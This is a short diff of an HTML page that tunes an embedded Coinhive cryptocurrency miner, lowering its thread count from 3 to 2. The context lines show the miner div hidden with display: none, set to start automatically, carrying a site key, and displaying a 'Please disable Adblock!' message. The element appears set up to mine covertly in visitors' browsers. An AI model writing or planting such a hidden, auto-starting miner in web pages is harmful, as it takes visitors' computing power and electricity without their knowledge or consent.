@@ -9,7 +9,7 @@
 <div class="coinhive-miner"
      style="display: none;"
      data-autostart="true"
-     data-threads="3"
+     data-threads="2"
      data-key="Y5nPKsSI2WomptAIvksYIV9UTcTZ0gDO">
     <em>Please disable Adblock!</em>
 </div>
